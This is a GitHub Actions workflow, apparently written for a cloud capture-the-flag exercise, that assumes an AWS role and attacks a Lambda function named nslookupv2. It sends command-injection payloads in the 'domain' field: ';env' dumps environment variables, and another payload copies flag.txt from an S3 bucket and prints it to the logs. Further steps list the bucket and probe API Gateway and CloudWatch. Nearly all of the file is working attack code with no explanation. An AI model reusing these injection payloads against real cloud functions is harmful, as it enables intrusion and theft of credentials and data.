name: deploy
on:
  push:
    branches:
      - corgi
jobs:
  aws:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Get AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: AWS identity
        run: aws sts get-caller-identity

      - name: Direct invoke - benign baseline
        run: |
          aws lambda invoke --function-name nslookupv2 \
            --payload '{"domain":"example.com"}' \
            --cli-binary-format raw-in-base64-out \
            --log-type Tail \
            --query 'LogResult' --output text out1.txt || echo "direct invoke denied"
          echo "----- decoded tail -----"
          cat out1.txt 2>/dev/null | base64 -d 2>/dev/null || true

      - name: Direct invoke - env leak
        run: |
          aws lambda invoke --function-name nslookupv2 \
            --payload '{"domain":";env"}' \
            --cli-binary-format raw-in-base64-out \
            --log-type Tail \
            --query 'LogResult' --output text out2.txt || true
          echo "----- decoded tail -----"
          cat out2.txt 2>/dev/null | base64 -d 2>/dev/null || true

      - name: Direct invoke - read flag via lambdaRole, cat to logs
        run: |
          aws lambda invoke --function-name nslookupv2 \
            --payload '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/f.txt --region us-east-1 && cat /tmp/f.txt"}' \
            --cli-binary-format raw-in-base64-out \
            --log-type Tail \
            --query 'LogResult' --output text out3.txt || true
          echo "----- decoded tail -----"
          cat out3.txt 2>/dev/null | base64 -d 2>/dev/null || true

      - name: Direct invoke - list bucket via lambdaRole (sanity check)
        run: |
          aws lambda invoke --function-name nslookupv2 \
            --payload '{"domain":";aws s3 ls s3://codec4f26c862a321ef5/ --region us-east-1"}' \
            --cli-binary-format raw-in-base64-out \
            --log-type Tail \
            --query 'LogResult' --output text out4.txt || true
          echo "----- decoded tail -----"
          cat out4.txt 2>/dev/null | base64 -d 2>/dev/null || true

      - name: Inspect API Gateway (why HTTP path always returns static wip)
        run: |
          API_ID="3q931syi7b"
          echo "===== resources ====="
          aws apigateway get-resources --rest-api-id "$API_ID" || echo "denied"
          echo "===== stages ====="
          aws apigateway get-stages --rest-api-id "$API_ID" || echo "denied"

      - name: Fallback - try CloudWatch logs directly
        run: |
          aws logs describe-log-streams \
            --log-group-name /aws/lambda/nslookupv2 \
            --order-by LastEventTime --descending --limit 3 || echo "logs denied"
